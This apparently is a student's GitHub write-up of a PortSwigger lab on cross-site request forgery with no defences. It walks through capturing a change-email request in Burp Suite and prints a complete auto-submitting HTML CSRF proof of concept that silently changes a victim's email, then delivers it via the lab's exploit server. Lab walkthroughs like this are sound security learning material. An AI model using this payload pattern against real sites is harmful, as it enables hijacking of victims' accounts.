## Lab Description :

![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/cf0298e2-f801-4dff-ad82-1ba2a4e6362b)

## Solution :

Open Burp's browser and log in to your account using `wener:peter`.

![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/229bd2c6-3300-41f5-93fd-6fbc35cb0844)

Submit the "Update email" form, and find the resulting request in your Proxy history.

![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/d97428f5-cb93-4973-afca-3ab57db09ce9)

Send it repeter

![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/47762557-b59f-45d2-ac28-6c94c3b660e8)

If you're using Burp Suite Professional, right-click on the request and select `Engagement tools` / `Generate CSRF PoC`.

![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/29946009-800f-4c8f-a34f-1b76714950ce)

Enable the option to include an auto-submit script and click "Regenerate".and then i changed the email from `cyber` to `ananthan`. 

![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/8a87f879-219c-4e16-8006-331c2308d3cf)

geneted the payload.

```html
<html>

  <!-- CSRF PoC - generated by Burp Suite Professional -->

  <body>

    <form action="https://0adb002a04fee11e80857b2a008500da.web-security-academy.net/my-account/change-email" method="POST">

      <input type="hidden" name="email" value="ananthan&#64;gmail&#46;com" />

      <input type="submit" value="Submit request" />

    </form>

    <script>

      history.pushState('', '', '/');

      document.forms[0].submit();

    </script>

  </body>

</html>

```
Go to the exploit server, paste your exploit HTML into the "Body" section, and click "Store".

![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/794f0017-f67d-4b48-9f69-8e88754ddd9b)

To verify that the exploit works, try it on yourself by clicking `"View exploit"` and then check the resulting HTTP request and response.

![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/90ee76e1-0626-4cc8-b262-6b5913e85db3)

we can that email has changed .Now Click `"Deliver to victim"` and solve the lab.

